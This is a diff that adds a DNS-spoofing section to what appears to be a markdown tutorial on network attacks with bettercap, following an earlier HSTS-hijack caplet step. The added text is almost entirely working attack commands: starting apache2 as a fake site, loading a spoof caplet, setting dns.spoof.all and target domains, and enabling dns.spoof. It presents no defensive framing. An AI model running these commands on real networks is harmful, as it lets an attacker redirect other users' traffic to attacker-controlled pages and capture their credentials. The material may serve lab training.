@@ -170,3 +170,26 @@ Here I am using "hstshijack/hstshijack" caplet. So
 ```bash
 hstshijack/hstshijack
 ```
+
+## DNS Spoofing:
+```bash
+service apache2 start
+```
+Now if you browse your ip, you can see the apache default website which is in "/var/www/html/".
+```bash
+bettercap -iface wlan0 -caplet /root/spoof.cap
+```
+Inside the "spoof.cap" file, the bettercap commands are present. Now to know more about "dns.spoof" module, execute
+```bash
+help dns.spoof
+```
+To change the values,
+```bash
+set dns.spoof.all true
+set dns.spoof.domains zsecurity.org,*.zsecurity.org
+```
+Now start the dns
+```bash
+dns.spoof on
+```
+All websites works without only HSTS websites.
